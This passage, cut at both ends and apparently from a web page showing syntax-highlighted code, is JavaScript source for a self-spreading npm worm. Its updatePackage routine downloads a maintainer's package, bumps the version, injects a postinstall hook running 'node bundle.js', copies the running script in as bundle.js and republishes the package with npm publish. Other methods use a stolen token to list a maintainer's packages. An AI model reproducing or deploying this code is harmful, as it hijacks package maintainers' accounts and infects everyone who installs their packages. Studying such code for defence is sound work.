</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="n">data</span> <span class="o">=</span> <span class="n">await</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">data</span><span class="o">.</span><span class="n">username</span> <span class="o">||</span> <span class="n">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">error</span> <span class="n">instanceof</span> <span class="n">Error</span> <span class="o">&amp;&amp;</span> <span class="n">error</span><span class="o">.</span><span class="n">message</span><span class="o">.</span><span class="n">includes</span><span class="p">(</span><span class="s2">&#34;Invalid NPM token&#34;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">throw</span> <span class="n">error</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="n">throw</span> <span class="n">new</span> <span class="n">Error</span><span class="p">(</span><span class="err">`</span><span class="n">Failed</span> <span class="n">to</span> <span class="n">validate</span> <span class="n">NPM</span> <span class="n">token</span><span class="p">:</span> <span class="o">$</span><span class="p">{</span><span class="n">error</span><span class="p">}</span><span class="err">`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">getHeaders</span><span class="p">(</span><span class="n">isDetailRequest</span> <span class="o">=</span> <span class="bp">false</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="n">this</span><span class="o">.</span><span class="n">userAgent</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip, deflate, br&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">isDetailRequest</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">headers</span><span class="o">.</span><span class="n">Accept</span> <span class="o">=</span> <span class="s2">&#34;application/json&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">headers</span><span class="p">[</span><span class="s2">&#34;Npm-Auth-Type&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;web&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">headers</span><span class="p">[</span><span class="s2">&#34;Npm-Command&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;view&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">headers</span><span class="p">[</span><span class="s2">&#34;Pacote-Version&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;15.0.7&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">headers</span><span class="p">[</span><span class="s2">&#34;Pacote-Req-Type&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;packument&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">headers</span><span class="o">.</span><span class="n">Connection</span> <span class="o">=</span> <span class="s2">&#34;close&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">headers</span><span class="o">.</span><span class="n">Accept</span> <span class="o">=</span> <span class="s2">&#34;*/*&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">headers</span><span class="p">[</span><span class="s2">&#34;Npm-Auth-Type&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;web&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">headers</span><span class="p">[</span><span class="s2">&#34;Npm-Command&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;search&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">token</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">headers</span><span class="o">.</span><span class="n">Authorization</span> <span class="o">=</span> <span class="err">`</span><span class="n">Bearer</span> <span class="o">$</span><span class="p">{</span><span class="n">this</span><span class="o">.</span><span class="n">token</span><span class="p">}</span><span class="err">`</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">headers</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">async</span> <span class="n">searchPackages</span><span class="p">(</span><span class="n">query</span><span class="p">,</span> <span class="n">limit</span> <span class="o">=</span> <span class="mi">20</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">searchPath</span> <span class="o">=</span> <span class="err">`</span><span class="o">/-/</span><span class="n">v1</span><span class="o">/</span><span class="n">search</span><span class="err">?</span><span class="n">text</span><span class="o">=$</span><span class="p">{</span><span class="n">encodeURIComponent</span><span class="p">(</span><span class="n">query</span><span class="p">)}</span><span class="o">&amp;</span><span class="n">size</span><span class="o">=$</span><span class="p">{</span><span class="n">limit</span><span class="p">}</span><span class="err">`</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">url</span> <span class="o">=</span> <span class="err">`</span><span class="o">$</span><span class="p">{</span><span class="n">this</span><span class="o">.</span><span class="n">baseUrl</span><span class="p">}</span><span class="o">$</span><span class="p">{</span><span class="n">searchPath</span><span class="p">}</span><span class="err">`</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="n">response</span> <span class="o">=</span> <span class="n">await</span> <span class="n">fetch</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">method</span><span class="p">:</span> <span class="s2">&#34;GET&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">headers</span><span class="p">:</span> <span class="n">this</span><span class="o">.</span><span class="n">getHeaders</span><span class="p">(</span><span class="bp">false</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">response</span><span class="o">.</span><span class="n">ok</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">throw</span> <span class="n">new</span> <span class="n">Error</span><span class="p">(</span><span class="err">`</span><span class="n">HTTP</span> <span class="o">$</span><span class="p">{</span><span class="n">response</span><span class="o">.</span><span class="n">status</span><span class="p">}:</span> <span class="o">$</span><span class="p">{</span><span class="n">response</span><span class="o">.</span><span class="n">statusText</span><span class="p">}</span><span class="err">`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="n">data</span> <span class="o">=</span> <span class="n">await</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">data</span><span class="o">.</span><span class="n">objects</span> <span class="o">||</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">console</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="s2">&#34;Error searching packages:&#34;</span><span class="p">,</span> <span class="n">error</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">async</span> <span class="n">getPackageDetail</span><span class="p">(</span><span class="n">packageName</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">url</span> <span class="o">=</span> <span class="err">`</span><span class="o">$</span><span class="p">{</span><span class="n">this</span><span class="o">.</span><span class="n">baseUrl</span><span class="p">}</span><span class="o">/$</span><span class="p">{</span><span class="n">encodeURIComponent</span><span class="p">(</span><span class="n">packageName</span><span class="p">)}</span><span class="err">`</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">this</span><span class="o">.</span><span class="n">getHeaders</span><span class="p">(</span><span class="bp">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">headers</span><span class="p">[</span><span class="s2">&#34;Pacote-Pkg-Id&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="err">`</span><span class="n">registry</span><span class="p">:</span><span class="o">$</span><span class="p">{</span><span class="n">packageName</span><span class="p">}</span><span class="err">`</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="n">response</span> <span class="o">=</span> <span class="n">await</span> <span class="n">fetch</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">method</span><span class="p">:</span> <span class="s2">&#34;GET&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">headers</span><span class="p">:</span> <span class="n">headers</span>
</span></span><span class="line"><span class="cl">      <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">response</span><span class="o">.</span><span class="n">ok</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">throw</span> <span class="n">new</span> <span class="n">Error</span><span class="p">(</span><span class="err">`</span><span class="n">HTTP</span> <span class="o">$</span><span class="p">{</span><span class="n">response</span><span class="o">.</span><span class="n">status</span><span class="p">}:</span> <span class="o">$</span><span class="p">{</span><span class="n">response</span><span class="o">.</span><span class="n">statusText</span><span class="p">}</span><span class="err">`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">await</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">throw</span> <span class="n">new</span> <span class="n">Error</span><span class="p">(</span><span class="err">`</span><span class="n">Failed</span> <span class="n">to</span> <span class="n">fetch</span> <span class="n">package</span> <span class="n">details</span><span class="p">:</span> <span class="o">$</span><span class="p">{</span><span class="n">error</span><span class="p">}</span><span class="err">`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">async</span> <span class="n">updatePackage</span><span class="p">(</span><span class="n">packageInfo</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="n">execAsync</span> <span class="o">=</span> <span class="n">promisify</span><span class="p">(</span><span class="n">exec</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="o">//</span> <span class="n">Check</span> <span class="k">if</span> <span class="n">tar</span> <span class="n">is</span> <span class="n">available</span>
</span></span><span class="line"><span class="cl">      <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">await</span> <span class="n">execAsync</span><span class="p">(</span><span class="s2">&#34;which tar&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span> <span class="n">catch</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">Buffer</span><span class="o">.</span><span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="n">response</span> <span class="o">=</span> <span class="n">await</span> <span class="n">fetch</span><span class="p">(</span><span class="n">packageInfo</span><span class="o">.</span><span class="n">tarballUrl</span><span class="p">,</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">method</span><span class="p">:</span> <span class="s2">&#34;GET&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">headers</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="n">this</span><span class="o">.</span><span class="n">userAgent</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="n">Accept</span><span class="p">:</span> <span class="s2">&#34;*/*&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip, deflate, br&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">response</span><span class="o">.</span><span class="n">ok</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">throw</span> <span class="n">new</span> <span class="n">Error</span><span class="p">(</span><span class="err">`</span><span class="n">Failed</span> <span class="n">to</span> <span class="n">download</span> <span class="n">tarball</span><span class="p">:</span> <span class="o">$</span><span class="p">{</span><span class="n">response</span><span class="o">.</span><span class="n">status</span><span class="p">}</span> <span class="o">$</span><span class="p">{</span><span class="n">response</span><span class="o">.</span><span class="n">statusText</span><span class="p">}</span><span class="err">`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="n">tarballBuffer</span> <span class="o">=</span> <span class="n">Buffer</span><span class="o">.</span><span class="n">from</span><span class="p">(</span><span class="n">await</span> <span class="n">response</span><span class="o">.</span><span class="n">arrayBuffer</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="n">tempDir</span> <span class="o">=</span> <span class="n">await</span> <span class="n">fs</span><span class="o">.</span><span class="n">mkdtemp</span><span class="p">(</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">tmpdir</span><span class="p">(),</span> <span class="s2">&#34;npm-update-&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="n">tarballPath</span> <span class="o">=</span> <span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">tempDir</span><span class="p">,</span> <span class="s2">&#34;package.tgz&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="n">tarPath</span> <span class="o">=</span> <span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">tempDir</span><span class="p">,</span> <span class="s2">&#34;package.tar&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="n">updatedTarballPath</span> <span class="o">=</span> <span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">tempDir</span><span class="p">,</span> <span class="s2">&#34;updated.tgz&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="o">//</span> <span class="n">Write</span> <span class="ow">and</span> <span class="n">extract</span> <span class="n">the</span> <span class="n">tarball</span>
</span></span><span class="line"><span class="cl">        <span class="n">await</span> <span class="n">fs</span><span class="o">.</span><span class="n">writeFile</span><span class="p">(</span><span class="n">tarballPath</span><span class="p">,</span> <span class="n">tarballBuffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">await</span> <span class="n">execAsync</span><span class="p">(</span><span class="err">`</span><span class="n">gzip</span> <span class="o">-</span><span class="n">d</span> <span class="o">-</span><span class="n">c</span> <span class="o">$</span><span class="p">{</span><span class="n">tarballPath</span><span class="p">}</span> <span class="o">&gt;</span> <span class="o">$</span><span class="p">{</span><span class="n">tarPath</span><span class="p">}</span><span class="err">`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">await</span> <span class="n">execAsync</span><span class="p">(</span><span class="err">`</span><span class="n">tar</span> <span class="o">-</span><span class="n">xf</span> <span class="o">$</span><span class="p">{</span><span class="n">tarPath</span><span class="p">}</span> <span class="o">-</span><span class="n">C</span> <span class="o">$</span><span class="p">{</span><span class="n">tempDir</span><span class="p">}</span> <span class="n">package</span><span class="o">/</span><span class="n">package</span><span class="o">.</span><span class="n">json</span><span class="err">`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="o">//</span> <span class="n">Modify</span> <span class="n">package</span><span class="o">.</span><span class="n">json</span>
</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="n">packageJsonPath</span> <span class="o">=</span> <span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">tempDir</span><span class="p">,</span> <span class="s2">&#34;package&#34;</span><span class="p">,</span> <span class="s2">&#34;package.json&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="n">packageJsonContent</span> <span class="o">=</span> <span class="n">await</span> <span class="n">fs</span><span class="o">.</span><span class="n">readFile</span><span class="p">(</span><span class="n">packageJsonPath</span><span class="p">,</span> <span class="s2">&#34;utf-8&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="n">packageJson</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="n">packageJsonContent</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="o">//</span> <span class="n">Increment</span> <span class="n">version</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">packageJson</span><span class="o">.</span><span class="n">version</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="k">const</span> <span class="n">versionParts</span> <span class="o">=</span> <span class="n">packageJson</span><span class="o">.</span><span class="n">version</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="n">versionParts</span><span class="o">.</span><span class="n">length</span> <span class="o">===</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">const</span> <span class="n">major</span> <span class="o">=</span> <span class="n">parseInt</span><span class="p">(</span><span class="n">versionParts</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">            <span class="k">const</span> <span class="n">minor</span> <span class="o">=</span> <span class="n">parseInt</span><span class="p">(</span><span class="n">versionParts</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">            <span class="k">const</span> <span class="n">patch</span> <span class="o">=</span> <span class="n">parseInt</span><span class="p">(</span><span class="n">versionParts</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">isNaN</span><span class="p">(</span><span class="n">patch</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">              <span class="n">packageJson</span><span class="o">.</span><span class="n">version</span> <span class="o">=</span> <span class="err">`</span><span class="o">$</span><span class="p">{</span><span class="n">major</span><span class="p">}</span><span class="o">.$</span><span class="p">{</span><span class="n">minor</span><span class="p">}</span><span class="o">.$</span><span class="p">{</span><span class="n">patch</span> <span class="o">+</span> <span class="mi">1</span><span class="p">}</span><span class="err">`</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="o">//</span> <span class="n">Add</span> <span class="n">postinstall</span> <span class="n">script</span>
</span></span><span class="line"><span class="cl">        <span class="n">packageJson</span><span class="o">.</span><span class="n">scripts</span> <span class="o">||=</span> <span class="p">{};</span>
</span></span><span class="line"><span class="cl">        <span class="n">packageJson</span><span class="o">.</span><span class="n">scripts</span><span class="o">.</span><span class="n">postinstall</span> <span class="o">=</span> <span class="s2">&#34;node bundle.js&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">await</span> <span class="n">fs</span><span class="o">.</span><span class="n">writeFile</span><span class="p">(</span><span class="n">packageJsonPath</span><span class="p">,</span> <span class="n">JSON</span><span class="o">.</span><span class="n">stringify</span><span class="p">(</span><span class="n">packageJson</span><span class="p">,</span> <span class="n">null</span><span class="p">,</span> <span class="mi">2</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="o">//</span> <span class="n">Update</span> <span class="n">the</span> <span class="n">tar</span> <span class="n">archive</span>
</span></span><span class="line"><span class="cl">        <span class="n">await</span> <span class="n">execAsync</span><span class="p">(</span><span class="err">`</span><span class="n">tar</span> <span class="o">-</span><span class="n">uf</span> <span class="o">$</span><span class="p">{</span><span class="n">tarPath</span><span class="p">}</span> <span class="o">-</span><span class="n">C</span> <span class="o">$</span><span class="p">{</span><span class="n">tempDir</span><span class="p">}</span> <span class="n">package</span><span class="o">/</span><span class="n">package</span><span class="o">.</span><span class="n">json</span><span class="err">`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="o">//</span> <span class="n">Add</span> <span class="n">current</span> <span class="n">script</span> <span class="n">to</span> <span class="n">the</span> <span class="n">package</span>
</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="n">currentScript</span> <span class="o">=</span> <span class="n">process</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">currentScript</span> <span class="o">&amp;&amp;</span> <span class="n">await</span> <span class="n">fs</span><span class="o">.</span><span class="n">access</span><span class="p">(</span><span class="n">currentScript</span><span class="p">)</span><span class="o">.</span><span class="n">then</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="bp">true</span><span class="p">)</span><span class="o">.</span><span class="n">catch</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="bp">false</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="k">const</span> <span class="n">bundlePath</span> <span class="o">=</span> <span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">tempDir</span><span class="p">,</span> <span class="s2">&#34;package&#34;</span><span class="p">,</span> <span class="s2">&#34;bundle.js&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="k">const</span> <span class="n">bundleContent</span> <span class="o">=</span> <span class="n">await</span> <span class="n">fs</span><span class="o">.</span><span class="n">readFile</span><span class="p">(</span><span class="n">currentScript</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="n">await</span> <span class="n">fs</span><span class="o">.</span><span class="n">writeFile</span><span class="p">(</span><span class="n">bundlePath</span><span class="p">,</span> <span class="n">bundleContent</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="n">await</span> <span class="n">execAsync</span><span class="p">(</span><span class="err">`</span><span class="n">tar</span> <span class="o">-</span><span class="n">uf</span> <span class="o">$</span><span class="p">{</span><span class="n">tarPath</span><span class="p">}</span> <span class="o">-</span><span class="n">C</span> <span class="o">$</span><span class="p">{</span><span class="n">tempDir</span><span class="p">}</span> <span class="n">package</span><span class="o">/</span><span class="n">bundle</span><span class="o">.</span><span class="n">js</span><span class="err">`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="o">//</span> <span class="n">Recompress</span> <span class="ow">and</span> <span class="n">publish</span>
</span></span><span class="line"><span class="cl">        <span class="n">await</span> <span class="n">execAsync</span><span class="p">(</span><span class="err">`</span><span class="n">gzip</span> <span class="o">-</span><span class="n">c</span> <span class="o">$</span><span class="p">{</span><span class="n">tarPath</span><span class="p">}</span> <span class="o">&gt;</span> <span class="o">$</span><span class="p">{</span><span class="n">updatedTarballPath</span><span class="p">}</span><span class="err">`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">await</span> <span class="n">execAsync</span><span class="p">(</span><span class="err">`</span><span class="n">npm</span> <span class="n">publish</span> <span class="o">$</span><span class="p">{</span><span class="n">updatedTarballPath</span><span class="p">}</span><span class="err">`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="o">//</span> <span class="n">Cleanup</span>
</span></span><span class="line"><span class="cl">        <span class="n">await</span> <span class="n">fs</span><span class="o">.</span><span class="n">rm</span><span class="p">(</span><span class="n">tempDir</span><span class="p">,</span> <span class="p">{</span> <span class="n">recursive</span><span class="p">:</span> <span class="bp">true</span><span class="p">,</span> <span class="n">force</span><span class="p">:</span> <span class="bp">true</span> <span class="p">});</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="o">//</span> <span class="n">Cleanup</span> <span class="n">on</span> <span class="n">error</span>
</span></span><span class="line"><span class="cl">        <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="n">await</span> <span class="n">fs</span><span class="o">.</span><span class="n">rm</span><span class="p">(</span><span class="n">tempDir</span><span class="p">,</span> <span class="p">{</span> <span class="n">recursive</span><span class="p">:</span> <span class="bp">true</span><span class="p">,</span> <span class="n">force</span><span class="p">:</span> <span class="bp">true</span> <span class="p">});</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="n">catch</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">        <span class="n">throw</span> <span class="n">error</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">throw</span> <span class="n">new</span> <span class="n">Error</span><span class="p">(</span><span class="err">`</span><span class="n">Failed</span> <span class="n">to</span> <span class="n">update</span> <span class="n">package</span><span class="p">:</span> <span class="o">$</span><span class="p">{</span><span class="n">error</span><span class="p">}</span><span class="err">`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">async</span> <span class="n">getPackagesByMaintainer</span><span class="p">(</span><span class="n">maintainer</span><span class="p">,</span> <span class="n">limit</span> <span class="o">=</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="n">searchResults</span> <span class="o">=</span> <span class="n">await</span> <span class="n">this</span><span class="o">.</span><span class="n">searchPackages</span><span class="p">(</span><span class="err">`</span><span class="n">maintainer</span><span class="p">:</span><span class="o">$</span><span class="p">{</span><span class="n">maintainer</span><span class="p">}</span><span class="err">`</span><span class="p">,</span> <span class="n">limit</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="n">packages</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">for</span> <span class="p">(</span><span class="k">const</span> <span class="n">result</span> <span class="n">of</span> <span class="n">searchResults</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">try</span> <span class="p">{</span>
